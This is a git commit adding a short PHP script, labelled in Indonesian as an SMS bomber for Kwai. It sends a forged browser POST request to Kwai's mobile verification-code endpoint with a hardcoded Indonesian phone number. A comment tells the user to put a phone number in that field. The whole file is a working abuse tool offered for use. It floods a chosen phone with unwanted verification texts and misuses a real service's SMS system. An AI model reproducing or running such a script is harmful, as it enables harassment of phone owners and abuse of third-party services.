4fbeda84db3423330ef1175c7077285eb7f8852c
Sandro putraa <35316669+sandroputraa@users.noreply.github.com>
2018-05-12 19:10:57 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,13 @@
+<?php
+*//@sandro.putraa
+*//Bomb SMS KWAI :v
+
+$body = '{"mobile":82332657754,"countryCode":"+62","bizType":38}';  //No hp lu kasi setelah "mobile": ( 82xxxxxxxxx ) tanpa 62
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://m.kwai.com/o/nodeapi/oversea/rest/o/p/mobile/sendMobileCode");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:application/json","Accept-Encoding:gzip, deflate, br","Connection:keep-alive","Content-Length:55","Referer:https://m.kwai.com/o/indo/invite/friends","User-Agent:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"));
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
+$result = curl_exec($ch);
+?>
